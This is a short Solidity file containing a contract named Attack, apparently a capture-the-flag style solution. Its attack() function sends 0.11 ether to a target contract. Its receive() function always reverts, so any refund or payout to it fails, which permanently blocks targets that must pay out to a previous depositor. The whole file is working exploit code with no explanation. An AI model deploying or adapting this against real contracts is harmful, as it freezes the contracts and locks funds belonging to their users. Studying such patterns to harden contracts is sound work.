// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Attack {
    
    function attack(address payable addressToAttack) external payable{
        addressToAttack.call{value: 0.11 ether}("");        
    }
    receive() external payable {
        revert("ERROR");
    }

}

